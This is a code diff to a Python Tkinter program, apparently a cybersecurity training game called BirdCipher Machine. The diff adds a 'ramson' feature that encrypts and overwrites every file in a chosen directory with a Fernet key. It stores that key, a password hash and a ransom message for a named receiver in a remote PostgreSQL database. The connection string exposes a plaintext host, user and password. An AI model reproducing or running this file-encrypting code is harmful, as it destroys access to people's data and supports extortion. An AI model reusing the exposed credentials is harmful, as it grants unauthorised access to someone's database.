@@ -137,6 +137,7 @@ nickname_db = ''
 password_db = ''
 target_person = ''
 target_person_decrypt = ''
+target_receiver_ramson = ''
 message_sent_decrypt = ''
 key_sent_decrypt = ''
 key_encryption = ""
@@ -1363,6 +1364,7 @@ def GUI_BirdCipher_Machine():
 	global token
 	global counter_social_eng
 	global key_ramson
+	global target_receiver_ramson
 	
 
 	
@@ -1638,6 +1640,20 @@ def GUI_BirdCipher_Machine():
 
 			playsound('activatePersonReceiveMessages.mp3')
 
+
+	def receiver_ramson_actv():
+
+		global target_receiver_ramson
+
+		if receiver_var.get() != '':
+
+			target_receiver_ramson = receiver_var.get()
+			playsound('bambu_click.mp3')
+
+		elif receiver_var.get() == '':
+
+			playsound('bambu_click.mp3')
+
 	
 	decrypt = tk.Tk()
 
@@ -1660,7 +1676,8 @@ def GUI_BirdCipher_Machine():
 	person2c_var = tk.StringVar()
 	person3c_var = tk.StringVar()
 	person4c_var = tk.StringVar()
-	
+
+	receiver_var = tk.StringVar()
 
 	person1_activated = False
 	person2_activated = False
@@ -1876,6 +1893,7 @@ def GUI_BirdCipher_Machine():
 	person2_image = tk.PhotoImage(file = 'Person2.png')
 	person3_image = tk.PhotoImage(file = 'Person3.png')
 	person4_image = tk.PhotoImage(file = 'Person4.png')
+	receiver_ramson_image = tk.PhotoImage(file = 'Receiver.png')
 
 	cipher_text2 = tk.Text(fr2, font = ("Comic Sans MS", 10), width = 80)
 	cipher_text2.config(bg = '#050005', fg = '#FFFFFF')
@@ -2112,16 +2130,20 @@ def GUI_BirdCipher_Machine():
 	ramsonDirectoryUrl.config(bg = '#050005', fg = '#FFFFFF')
 	ramsonDirectoryUrl.place(x = 60, y = 210, height = 30)
 
-	buttonReceiver = tk.Button(fr0a, image = imagePoints, command = lambda:pointsAudio())
-	buttonReceiver.place(x = 360, y = 280)
+	buttonReceiver = tk.Button(fr0a, image = receiver_ramson_image, command = lambda:receiver_ramson_actv())
+	buttonReceiver.place(x = 570, y = 280)
+
+	entry_receiver_ramson = tk.Entry(fr0a, textvariable = receiver_var, font = ("Comic Sans MS", 13), justify = "center", width = 13)
+	entry_receiver_ramson.config(bg = "#050005", fg = "#7e086c")
+	entry_receiver_ramson.place(x = 570, y = 435)
 
 	generateKeyRamson = tk.Button(fr0a, image = generateRamsonKey_de, command = lambda:generate_key_ramson())
-	generateKeyRamson.place(x = 480, y = 280)
+	generateKeyRamson.place(x = 330, y = 280)
 
 	bringKeyRamson = tk.Button(fr0a, image = bringRamsonKey_de)
-	bringKeyRamson.place(x = 480, y = 390)
+	bringKeyRamson.place(x = 330, y = 390)
 
-	encryptFilesButton = tk.Button(fr0a, image = decryptFilesImage)
+	encryptFilesButton = tk.Button(fr0a, image = decryptFilesImage, command = lambda:encrypt_files_ramson_funct())
 	encryptFilesButton.place(x = 830, y = 260)
 
 	decryptFilesButton = tk.Button(fr0a, image = encryptFilesImage)
@@ -2146,6 +2168,77 @@ def GUI_BirdCipher_Machine():
 
 		key_ramson = Fernet.generate_key()
 		ramsonKey.config(text = key_ramson)
+
+	def execution_encrypt_files(items, key):
+
+		i = Fernet(key)
+		for x in items:
+			with open(x, 'rb') as file:
+
+				file_data = file.read()
+				data = i.encrypt(file_data)
+			with open(x, 'wb') as file:
+
+				file.write(data)
+
+
+
+
+	def encrypt_files_ramson_funct():
+
+
+		wdatos = bytes(password_for_ramson.get(), 'utf-8')
+		h = hashlib.new(algoritmo, wdatos)
+		hash2 = HASH.generaHash(h)
+
+		miConexion12 = psycopg2.connect(host = 'baak8kinqrfryal5bhvp-postgresql.services.clever-cloud.com', port = 50013, 
+		user = 'urnsamk6lldavmbxb6ev', dbname = 'baak8kinqrfryal5bhvp', password = 'nMjCFD00O0DJOmYjbjbZ8sCDdI8wxw')
+		
+		miCursor12 = miConexion12.cursor()
+
+		sql_verf_hash_ramson = 'select * from Players where nickname = (%s)'
+		sql_verf_hash_data_ramson = (nickname_db,)
+		miCursor12.execute(sql_verf_hash_ramson, sql_verf_hash_data_ramson)
+		dlt5 = miCursor12.fetchall()
+
+		if dlt5[0][5] >= 1 and hash2 == dlt5[0][3]:
+
+			if target_receiver_ramson != '':
+
+				sql_ramson_verf = 'select * from ramson_bird where (client = (%s) and server = (%s))'
+				sql_ramson_verf_data = (nickname_db, target_receiver_ramson)
+				miCursor12.execute(sql_ramson_verf, sql_ramson_verf_data)
+				df20 = miCursor12.fetchall()
+				df12_test = True
+
+				if len(df20) == 0 and df12_test == True:
+
+					if directory != '' and ramsonBird_message.get("1.0", "end-1c") != '':
+
+						sql1234 = 'insert into ramson_bird(client, password, server, key_c, description) values(%s,%s,%s,%s,%s)'
+						datos_sql1234 = (nickname_db, hash2, target_receiver_ramson, key_ramson.decode(), ramsonBird_message.get('1.0', 'end-1c'))
+						miCursor12.execute(sql1234, datos_sql1234)
+						archivos = directory
+						items = os.listdir(archivos)
+						archivos2 = [archivos + '/' + x for x in items]
+						execution_encrypt_files(archivos2, key_ramson)
+						print(key_ramson)
+
+						playsound('bambu_click.mp3')
+
+
+
+
+
+
+
+
+		miConexion12.commit()
+		miConexion12.close()
+
+
+
+
 
 
 
